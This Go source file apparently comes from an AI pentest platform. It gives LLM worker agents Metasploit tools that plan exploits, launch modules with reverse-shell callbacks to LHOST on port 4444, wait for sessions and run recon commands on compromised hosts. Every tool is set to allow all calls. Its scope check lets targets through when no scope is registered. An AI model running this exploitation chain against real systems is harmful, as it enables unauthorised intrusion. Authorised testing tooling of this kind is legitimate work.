package server

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"os"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/Autumn-27/artex/agent"
	"github.com/Autumn-27/artex/db"
	"github.com/Autumn-27/artex/msf"
	"github.com/Autumn-27/norma/llm"
	"github.com/Autumn-27/norma/permission"
	actool "github.com/Autumn-27/norma/tool"
)

// msfArgs is the shared input for the three Metasploit tools.
type msfArgs struct {
	VulnClass string `json:"vuln_class"`
	Product   string `json:"product"`
	Version   string `json:"version"`
	Host      string `json:"host"`
	Port      int    `json:"port"`
	Service   string `json:"service"`
	URL       string `json:"url"`
	SSL       *bool  `json:"ssl"`
	LHOST     string `json:"lhost"`
	LPORT     int    `json:"lport"`
}

func (a msfArgs) input() msf.Input {
	return msf.Input{
		VulnClass: a.VulnClass, Product: a.Product, Version: a.Version,
		Host: a.Host, Port: a.Port, Service: a.Service, URL: a.URL,
		SSL: a.SSL, LHOST: a.LHOST, LPORT: a.LPORT,
	}
}

func msfSchema() map[string]any {
	str := func(desc string) map[string]any { return map[string]any{"type": "string", "description": desc} }
	return map[string]any{
		"type": "object",
		"properties": map[string]any{
			"vuln_class": str("漏洞类别/产品/CVE（如 struts2、log4j、eternalblue、weblogic、redis 未授权）"),
			"product":    str("目标产品名（可选，辅助归一化）"),
			"version":    str("产品版本（可选）"),
			"host":       str("目标主机 IP/域名（必填）"),
			"port":       map[string]any{"type": "integer", "description": "目标端口（缺省按 service/URL 推断）"},
			"service":    str("服务名（http/https/ssh/smb/rdp/redis…）"),
			"url":        str("目标 URL（用于推导 TARGETURI 与 SSL）"),
			"ssl":        map[string]any{"type": "boolean", "description": "是否 HTTPS（缺省按 443/https URL 推断）"},
			"lhost":      str("反弹 payload 的回连地址（内网渗透时为平台可达地址）"),
			"lport":      map[string]any{"type": "integer", "description": "回连端口，默认 4444"},
		},
		"required": []any{"host"},
	}
}

// msfTools returns the three deterministic decision tools exposed to workers.
func (s *Server) msfTools() []actool.CoreTool {
	return []actool.CoreTool{s.msfPlanTool(), s.msfNextTool(), s.msfExecuteTool()}
}

// seedMSFTools seeds the tools into the catalog, bound to worker by default.
func (s *Server) seedMSFTools() {
	workerAgents, _ := json.Marshal([]string{"worker"})
	for _, t := range s.msfTools() {
		schema, _ := json.Marshal(t.InputSchema())
		if err := s.m.PG().SeedTool(t.Name(), t.Description(), schema, workerAgents); err != nil {
			log.Printf("[tools] seed %s 失败： %v", t.Name(), err)
		}
	}
}

func allowAll(context.Context, json.RawMessage, permission.Context) permission.Decision {
	return permission.Allowed()
}

// msf_plan: pure decision layer, no network I/O.
func (s *Server) msfPlanTool() actool.CoreTool {
	return actool.Build(actool.Spec{
		Name: "msf_plan",
		Description: "【Metasploit 决策层·只读】按漏洞类别/目标给出确定性的利用计划：候选模块（按置信度排序）、" +
			"每个模块的 RHOSTS/RPORT/TARGETURI/PAYLOAD 等参数、执行前置条件、失败分支与拿会话后的取证步骤。" +
			"同一输入永远得到同一 plan_id 与同一顺序，不受模型随机性影响。执行请用 msf_execute（自动跑完候选链）" +
			"或按计划手工调 MCP 工具（use_module/set_module_option/execute_module/list_sessions）。",
		Schema:      msfSchema(),
		ReadOnly:    func(json.RawMessage) bool { return true },
		Permissions: allowAll,
		Run: func(_ context.Context, in json.RawMessage, _ *actool.ToolContext) (actool.Result, error) {
			var a msfArgs
			_ = json.Unmarshal(in, &a)
			plan, err := msf.Build(a.input())
			if err != nil {
				return msfPlanError(err)
			}
			return jsonResult(map[string]any{
				"plan": plan,
				"next": "按 candidates 顺序执行；每次尝试后用 msf_next(attempt=i, outcome=session|no_session|error|module_missing|precheck_failed) 取下一步。",
			})
		},
	})
}

// msf_next: stateless branch selection (recomputes the deterministic plan).
func (s *Server) msfNextTool() actool.CoreTool {
	schema := msfSchema()
	schema["properties"].(map[string]any)["attempt"] = map[string]any{
		"type": "integer", "description": "刚尝试的候选下标（0-based，对应 plan.candidates[i].order-1）",
	}
	schema["properties"].(map[string]any)["outcome"] = map[string]any{
		"type": "string", "enum": []any{"session", "no_session", "error", "module_missing", "precheck_failed"},
		"description": "本次尝试的观察结果",
	}
	schema["required"] = []any{"host", "outcome"}
	return actool.Build(actool.Spec{
		Name: "msf_next",
		Description: "【Metasploit 决策层·只读】给定同一目标与本次尝试结果，返回确定性的下一步：" +
			"retry（换下一候选）/ session（拿会话，给出取证步骤）/ degrade（前置条件不满足，转验证）/ stop（候选耗尽，写否定 fact）。" +
			"无状态：同一输入+attempt+outcome 永远得到同一动作。",
		Schema:      schema,
		ReadOnly:    func(json.RawMessage) bool { return true },
		Permissions: allowAll,
		Run: func(_ context.Context, in json.RawMessage, _ *actool.ToolContext) (actool.Result, error) {
			var a struct {
				msfArgs
				Attempt int    `json:"attempt"`
				Outcome string `json:"outcome"`
			}
			_ = json.Unmarshal(in, &a)
			plan, err := msf.Build(a.input())
			if err != nil {
				return msfPlanError(err)
			}
			act := msf.Next(plan, a.Attempt, msf.Outcome(a.Outcome))
			return jsonResult(map[string]any{"plan_id": plan.PlanID, "action": act})
		},
	})
}

func msfPlanError(err error) (actool.Result, error) {
	if np, ok := err.(*msf.ErrNoPlan); ok {
		return jsonResult(map[string]any{
			"kind":             "search",
			"suggested_search": np.Search,
			"message":          np.Message,
		})
	}
	return actool.Errorf(err.Error()), nil
}

// ---------------- MCP execution ----------------

type msfSession struct {
	client    mcpClient
	tools     map[string]actool.CoreTool
	name      string
	host      string
	port      int
	plaintext bool
}

func (m *msfSession) tool(name string) (actool.CoreTool, bool) {
	if t, ok := m.tools[name]; ok {
		return t, true
	}
	for k, t := range m.tools {
		if strings.HasSuffix(k, "__"+name) || strings.HasSuffix(k, "/"+name) || k == name {
			return t, true
		}
	}
	return nil, false
}

// call invokes one MCP tool and returns its textual payload.
func (m *msfSession) call(ctx context.Context, name string, in any) (string, error) {
	t, ok := m.tool(name)
	if !ok {
		return "", fmt.Errorf("MCP 服务 %s 缺少工具 %s（检查 mcp-pymetasploit3 版本）", m.name, name)
	}
	raw, _ := json.Marshal(in)
	res, err := t.Call(ctx, raw, nil)
	if err != nil {
		return "", err
	}
	text := resultText(res)
	if res.IsError {
		return text, fmt.Errorf("%s 返回错误：%s", name, truncateForTool(text))
	}
	return text, nil
}

func resultText(r actool.Result) string {
	var b strings.Builder
	for _, c := range r.Content {
		if c.Type == llm.BlockText {
			b.WriteString(c.Text)
		}
	}
	return b.String()
}

func truncateForTool(s string) string {
	const max = 500
	if len(s) <= max {
		return s
	}
	return s[:max] + "…"
}

// msfConnect finds the enabled "metasploit" MCP server and dials it.
func (s *Server) msfConnect(ctx context.Context) (*msfSession, error) {
	if s.m == nil || s.m.pg == nil {
		return nil, fmt.Errorf("数据库未就绪，无法读取 MCP 配置")
	}
	list, err := s.m.pg.ListMCP()
	if err != nil {
		return nil, err
	}
	var srv *db.MCPServer
	for _, m := range list {
		if m.Enabled && strings.EqualFold(strings.TrimSpace(m.Name), "metasploit") {
			srv = m
			break
		}
	}
	if srv == nil {
		// 无需 UI 配置：直接用内置启动器拉起 mcp-pymetasploit3（console 脚本或 python -m）。
		cmd, args, ok := findMCPLauncher()
		if !ok {
			return nil, fmt.Errorf("未找到 mcp-pymetasploit3：请先 pip install mcp-pymetasploit3（或在「系统 → MCP」新建 stdio 服务）")
		}
		rawArgs, _ := json.Marshal(args)
		srv = &db.MCPServer{Name: "metasploit", Transport: "stdio", Command: cmd, Args: rawArgs, Env: json.RawMessage("{}")}
		log.Printf("[msf] 使用内置 MCP 配置拉起：%s %v", cmd, args)
	}
	c, err := connectMCP(ctx, srv)
	if err != nil {
		return nil, fmt.Errorf("连接 metasploit MCP 失败：%w", err)
	}
	tools, err := c.Tools(ctx)
	if err != nil {
		_ = c.Close()
		return nil, fmt.Errorf("读取 metasploit MCP 工具失败：%w", err)
	}
	host, port := s.msfRPCAddrPort()
	m := &msfSession{client: c, name: srv.Name, tools: map[string]actool.CoreTool{}, host: host, port: port}
	m.plaintext = s.msfRPC != nil && s.msfRPC.Plaintext()
	for _, t := range tools {
		m.tools[t.Name()] = t
	}
	return m, nil
}

// ensureRPC makes sure the MCP server is authenticated to msfrpcd. mode is
// "auto" (try TLS first, then plaintext), "true" or "false". Auto exists because
// msfrpcd enables TLS by default while `msfrpcd -S` serves plaintext, and both
// deployments are common.
func (m *msfSession) ensureRPC(ctx context.Context, password, mode string) (string, error) {
	info, _ := m.call(ctx, "get_client_info", map[string]any{})
	if strings.Contains(info, `"connected": true`) || strings.Contains(info, `"authenticated": true`) {
		return info, nil
	}
	if password == "" {
		return "", fmt.Errorf("Metasploit RPC 未连接，且没有提供密码：传 rpc_password 或设置 ARTEX_MSF_RPC_PASSWORD/设置项 msf_rpc_password")
	}
	modes := []bool{true, false}
	switch strings.ToLower(strings.TrimSpace(mode)) {
	case "true", "1", "yes":
		modes = []bool{true}
	case "false", "0", "no":
		modes = []bool{false}
	}
	var lastErr error
	for _, ssl := range modes {
		host := m.host
		if host == "" {
			host = "127.0.0.1"
		}
		port := m.port
		if port == 0 {
			port = 55553
		}
		txt, err := m.call(ctx, "connect", map[string]any{
			"password": password, "host": host, "port": port, "ssl": ssl,
		})
		if err == nil && (strings.Contains(txt, `"authenticated": true`) || strings.Contains(txt, `"status": "connected"`) || strings.Contains(txt, `"status":"connected"`)) {
			return txt, nil
		}
		if err == nil {
			err = fmt.Errorf("connect 返回未认证：%s", truncateForTool(txt))
		}
		lastErr = err
	}
	return "", fmt.Errorf("连接 msfrpcd 失败（已尝试 ssl=%v）：%v", modes, lastErr)
}

func parseSessionIDs(text string) map[string]bool {
	out := map[string]bool{}
	var m map[string]json.RawMessage
	if err := json.Unmarshal([]byte(strings.TrimSpace(text)), &m); err != nil {
		return out
	}
	for k := range m {
		if _, err := strconv.Atoi(k); err == nil {
			out[k] = true
		}
	}
	return out
}

func diffSessions(before, after map[string]bool) []string {
	var out []string
	for id := range after {
		if !before[id] {
			out = append(out, id)
		}
	}
	sort.Strings(out)
	return out
}

// msf_execute runs the deterministic candidate chain end-to-end over MCP.
func (s *Server) msfExecuteTool() actool.CoreTool {
	schema := msfSchema()
	props := schema["properties"].(map[string]any)
	props["rpc_password"] = map[string]any{"type": "string", "description": "msfrpcd 密码（缺省读 ARTEX_MSF_RPC_PASSWORD / 设置项 msf_rpc_password）"}
	props["rpc_ssl"] = map[string]any{"type": "string", "enum": []any{"auto", "true", "false"},
		"description": "msfrpcd 是否 SSL：auto=先试 SSL 再回退明文（默认，兼容默认 msfrpcd 与 -S 启动）"}
	props["max_candidates"] = map[string]any{"type": "integer", "description": "最多尝试几个候选，默认 3（上限 8）"}
	props["verify_session_seconds"] = map[string]any{"type": "integer", "description": "执行后等待新会话的秒数，默认 25（上限 120）"}
	return actool.Build(actool.Spec{
		Name: "msf_execute",
		Description: "【Metasploit 全自动闭环】按决策层候选链自动执行：连接已启用的 metasploit MCP → use_module → 设置参数 → " +
			"execute_module → 轮询 list_sessions 判断是否拿到新会话；无会话自动切下一候选，拿到会话即返回 session id 与取证步骤。" +
			"只应在已完成漏洞验证、目标在授权 scope 内时使用；执行前会检查模块存在性与前置端口。返回 transcript 供写回 fact。",
		Schema:      schema,
		ReadOnly:    func(json.RawMessage) bool { return false },
		Permissions: allowAll,
		Run: func(ctx context.Context, in json.RawMessage, _ *actool.ToolContext) (actool.Result, error) {
			var a struct {
				msfArgs
				RPCPassword string `json:"rpc_password"`
				RPCSsl      string `json:"rpc_ssl"`
				MaxCands    int    `json:"max_candidates"`
				WaitSecs    int    `json:"verify_session_seconds"`
			}
			_ = json.Unmarshal(in, &a)
			if a.MaxCands <= 0 || a.MaxCands > 8 {
				a.MaxCands = 3
			}
			if a.WaitSecs <= 0 || a.WaitSecs > 120 {
				a.WaitSecs = 25
			}
			plan, err := msf.Build(a.input())
			if err != nil {
				return msfPlanError(err)
			}
			if len(plan.Candidates) == 0 {
				return actool.Errorf("没有候选模块"), nil
			}
			// 授权范围硬校验：目标必须落在本任务已登记的 scope 内（未登记时放行并提示）。
			if ok, why := s.msfScopeAllows(ctx, a.Host); !ok {
				return actool.Errorf("拒绝执行：" + why + "。先登记 task scope 或由人批准扩 scope。"), nil
			}

			sess, err := s.msfConnect(ctx)
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			defer sess.client.Close()

			pw := a.RPCPassword
			if pw == "" {
				pw = os.Getenv("ARTEX_MSF_RPC_PASSWORD")
			}
			if pw == "" && s.m.pg != nil {
				pw, _, _ = s.m.pg.GetSetting("msf_rpc_password")
			}
			if pw == "" && s.msfRPC != nil {
				pw = s.msfRPC.Password()
			}
			sslMode := a.RPCSsl
			if sslMode == "" {
				sslMode = os.Getenv("ARTEX_MSF_RPC_SSL")
			}
			if sslMode == "" {
				if sess.plaintext {
					sslMode = "false" // 受管 msfrpcd 用 -S 启动（仅 loopback 明文）
				} else {
					sslMode = "auto"
				}
			}
			if _, err := sess.ensureRPC(ctx, pw, sslMode); err != nil {
				return actool.Errorf(err.Error()), nil
			}

			before := map[string]bool{}
			if txt, err := sess.call(ctx, "list_sessions", map[string]any{}); err == nil {
				before = parseSessionIDs(txt)
			}

			lp := a.LPORT
			if lp == 0 {
				lp = 4444
			}
			transcript := make([]map[string]any, 0, a.MaxCands*4)
			act := msf.Action{}
			var got []string
			attempted := 0
			for i, c := range plan.Candidates {
				if i >= a.MaxCands {
					break
				}
				attempted = i + 1
				// 1) module exists?
				if _, err := sess.call(ctx, "get_module_info", map[string]any{
					"module_type": c.ModuleType, "module_name": c.Module,
				}); err != nil {
					transcript = append(transcript, map[string]any{"candidate": i, "module": c.Module, "step": "module_missing", "detail": err.Error()})
					act = msf.Next(plan, i, msf.OutcomeModuleMissing)
					continue
				}
				// 2) 执行：MCP 的 use_module/set_module_option 是无状态的（每次调用都会
				// modules.use 一个新实例），跨调用设置的 TARGETURI/SSL 等不会生效。
				// 因此走 console 路径：use + set + run 在同一会话里串起来；console
				// 不可用时退回 execute_module（仅 rhosts/rport/lhost/lport/payload）。
				execTxt, execErr := sess.runCandidate(ctx, c, lp, a.WaitSecs)
				entry := map[string]any{"candidate": i, "module": c.Module, "payload": c.Payload, "step": "execute"}
				if execErr != nil {
					entry["error"] = execErr.Error()
				} else {
					entry["result"] = truncateForTool(execTxt)
				}
				transcript = append(transcript, entry)
				if execErr != nil {
					act = msf.Next(plan, i, msf.OutcomeError)
					continue
				}
				// 3) wait for a new session
				got = waitNewSessions(ctx, sess, before, a.WaitSecs)
				if len(got) > 0 {
					act = msf.Next(plan, i, msf.OutcomeSession)
					// 自动取证：拿到会话后立刻执行一组只读命令，把证据随结果返回，
					// 并写回 fact，闭合「利用→取证→写回」循环（不依赖模型再补一轮）。
					evidence := ""
					for _, sid := range got {
						if ev := s.msfSessionEvidence(ctx, sess, sid); ev != "" {
							evidence += fmt.Sprintf("[session %s]\n%s\n", sid, ev)
						}
					}
					s.msfRecordSessionFact(ctx, plan, got[0], evidence)
					transcript = append(transcript, map[string]any{
						"step": "session", "ids": got, "evidence": truncateForTool(evidence),
					})
					break
				}
				act = msf.Next(plan, i, msf.OutcomeNoSession)
				transcript = append(transcript, map[string]any{"step": "no_session", "candidate": i})
			}
			after := map[string]bool{}
			if txt, err := sess.call(ctx, "list_sessions", map[string]any{}); err == nil {
				after = parseSessionIDs(txt)
			}
			return jsonResult(map[string]any{
				"plan_id":      plan.PlanID,
				"attempted":    attempted,
				"sessions":     got,
				"all_sessions": keysOf(after),
				"action":       act,
				"transcript":   transcript,
				"note":         "拿到 session 后先按 action.post_steps 取证，再写回 fact；没有会话按 action 处理（retry/degrade/stop），不要重复同一候选。",
			})
		},
	})
}

func waitNewSessions(ctx context.Context, sess *msfSession, before map[string]bool, seconds int) []string {
	deadline := time.Now().Add(time.Duration(seconds) * time.Second)
	for {
		txt, err := sess.call(ctx, "list_sessions", map[string]any{})
		if err == nil {
			if got := diffSessions(before, parseSessionIDs(txt)); len(got) > 0 {
				return got
			}
		}
		if time.Now().After(deadline) {
			return nil
		}
		select {
		case <-ctx.Done():
			return nil
		case <-time.After(2 * time.Second):
		}
	}
}

func keysOf(m map[string]bool) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	sort.Strings(out)
	return out
}

// msfScopeAllows is a hard RoE gate for msf_execute: the target must fall inside
// the task's registered scope. Tasks without any scope row are allowed (bootstrap
// phase) but the reason is surfaced for auditing.
func (s *Server) msfScopeAllows(ctx context.Context, host string) (bool, string) {
	if s.m == nil || s.m.pg == nil {
		return true, ""
	}
	ri := agent.RunInfoFrom(ctx)
	if ri.TaskID == 0 {
		return true, "非任务上下文"
	}
	rows, err := s.m.pg.Assets().ListTaskScope(ri.TaskID)
	if err != nil {
		return false, "读取任务 scope 失败：" + err.Error()
	}
	if len(rows) == 0 {
		return true, "任务未登记 scope（bootstrap）"
	}
	h := strings.ToLower(strings.TrimSpace(host))
	ip := net.ParseIP(h)
	for _, r := range rows {
		switch r.Kind {
		case "ip":
			if strings.EqualFold(strings.TrimSpace(r.Value), h) {
				return true, ""
			}
		case "cidr":
			if ip != nil {
				if _, n, err := net.ParseCIDR(strings.TrimSpace(r.Net)); err == nil && n.Contains(ip) {
					return true, ""
				}
			}
		case "root_domain", "subdomain":
			d := strings.ToLower(strings.TrimSpace(r.Domain))
			if d != "" && (h == d || strings.HasSuffix(h, "."+d)) {
				return true, ""
			}
		}
	}
	return false, "目标 " + host + " 不在任务授权 scope 内"
}

// createConsole opens one Metasploit console and returns its id.
func (m *msfSession) createConsole(ctx context.Context) (string, error) {
	txt, err := m.call(ctx, "create_console", map[string]any{})
	if err != nil {
		return "", err
	}
	var out struct {
		CID string `json:"cid"`
	}
	if err := json.Unmarshal([]byte(txt), &out); err != nil || out.CID == "" {
		return "", fmt.Errorf("create_console 返回异常：%s", truncateForTool(txt))
	}
	return out.CID, nil
}

// runCandidate runs one candidate through a console so every option persists
// (the module tools are stateless per call). Falls back to execute_module when
// console creation is unavailable.
func (m *msfSession) runCandidate(ctx context.Context, c msf.Candidate, lport, seconds int) (string, error) {
	cid, err := m.createConsole(ctx)
	if err != nil {
		return m.execDirect(ctx, c, lport)
	}
	defer func() { _, _ = m.call(ctx, "destroy_console", map[string]any{"console_id": cid}) }()

	var script strings.Builder
	fmt.Fprintf(&script, "use %s\n", c.Module)
	keys := make([]string, 0, len(c.Options))
	for k := range c.Options {
		if k == "PAYLOAD" {
			continue
		}
		keys = append(keys, k)
	}
	sort.Strings(keys)
	for _, k := range keys {
		fmt.Fprintf(&script, "set %s %s\n", k, c.Options[k])
	}
	if c.Payload != "" {
		fmt.Fprintf(&script, "set PAYLOAD %s\n", c.Payload)
	}
	if lport > 0 {
		fmt.Fprintf(&script, "set LPORT %d\n", lport)
	}
	script.WriteString("run -j\n")
	if _, err := m.call(ctx, "write_console", map[string]any{"console_id": cid, "command": script.String()}); err != nil {
		return "", err
	}

	deadline := time.Now().Add(time.Duration(seconds) * time.Second)
	var out strings.Builder
	for {
		txt, err := m.call(ctx, "read_console", map[string]any{"console_id": cid})
		if err == nil {
			data, busy := consoleData(txt)
			if data != "" {
				out.WriteString(data)
			}
			low := strings.ToLower(out.String())
			if strings.Contains(low, "session") && !busy {
				break
			}
		}
		if time.Now().After(deadline) {
			break
		}
		select {
		case <-ctx.Done():
			return out.String(), ctx.Err()
		case <-time.After(2 * time.Second):
		}
	}
	return out.String(), nil
}

// execDirect is the reduced-fidelity fallback: execute_module only accepts
// rhosts/rport/lhost/lport/payload, so TARGETURI/SSL and other options are lost.
func (m *msfSession) execDirect(ctx context.Context, c msf.Candidate, lport int) (string, error) {
	args := map[string]any{"module_type": c.ModuleType, "module_name": c.Module}
	if c.Payload != "" {
		args["payload"] = c.Payload
	}
	if v, ok := c.Options["RHOSTS"]; ok {
		args["rhosts"] = v
	}
	if v, ok := c.Options["RPORT"]; ok {
		if n, err := strconv.Atoi(v); err == nil {
			args["rport"] = n
		}
	}
	if v, ok := c.Options["LHOST"]; ok {
		args["lhost"] = v
	}
	if lport > 0 {
		args["lport"] = lport
	}
	return m.call(ctx, "execute_module", args)
}

func consoleData(txt string) (string, bool) {
	var v struct {
		Data string `json:"data"`
		Busy bool   `json:"busy"`
	}
	if err := json.Unmarshal([]byte(txt), &v); err != nil {
		return txt, false
	}
	return v.Data, v.Busy
}

// msfSessionEvidence runs a read-only triage bundle in a fresh session and
// returns its output. Failures are non-fatal: the session itself is the win.
func (s *Server) msfSessionEvidence(ctx context.Context, sess *msfSession, id string) string {
	cmd := "id 2>/dev/null; whoami; hostname; uname -a 2>/dev/null; (ip -brief addr 2>/dev/null || ifconfig 2>/dev/null)"
	txt, err := sess.call(ctx, "session_run_command", map[string]any{
		"session_id": id, "command": cmd, "timeout": 60, "timeout_exception": false,
	})
	if err != nil {
		log.Printf("[msf] 会话 %s 取证失败：%v", id, err)
		return ""
	}
	return sessionOutput(txt)
}

func sessionOutput(txt string) string {
	var v struct {
		Output string `json:"output"`
	}
	if err := json.Unmarshal([]byte(txt), &v); err == nil && v.Output != "" {
		return strings.TrimSpace(v.Output)
	}
	return strings.TrimSpace(txt)
}

// msfRecordSessionFact writes the session + evidence back to the exploration
// graph so the loop is closed even if the model never emits a follow-up turn.
func (s *Server) msfRecordSessionFact(ctx context.Context, plan msf.Plan, sessionID, evidence string) {
	if s.m == nil || s.m.pg == nil {
		return
	}
	ri := agent.RunInfoFrom(ctx)
	if ri.TaskID <= 0 {
		return
	}
	task, ok := s.m.Task(strconv.FormatInt(ri.TaskID, 10))
	if !ok || task == nil || task.Store == nil {
		return
	}
	host := ""
	if len(plan.Candidates) > 0 {
		host = plan.Candidates[0].Options["RHOSTS"]
	}
	if len(evidence) > 4000 {
		evidence = evidence[:4000] + "…[截断]"
	}
	payload := map[string]any{
		"summary":        fmt.Sprintf("MSF 会话建立：session %s（%s，目标 %s）", sessionID, plan.Class, host),
		"evidence":       evidence,
		"confidence":     "confirmed",
		"msf_session_id": sessionID,
		"msf_plan_id":    plan.PlanID,
		"msf_host":       host,
	}
	if _, err := task.Store.AddNode(db.KindFact, payload, 0, "confirmed", "worker", nil); err != nil {
		log.Printf("[msf] 写回会话 fact 失败：%v", err)
		return
	}
	task.Notify()
	log.Printf("[msf] 会话 %s 已写回 fact（任务 %d，%s）", sessionID, ri.TaskID, plan.Class)
}
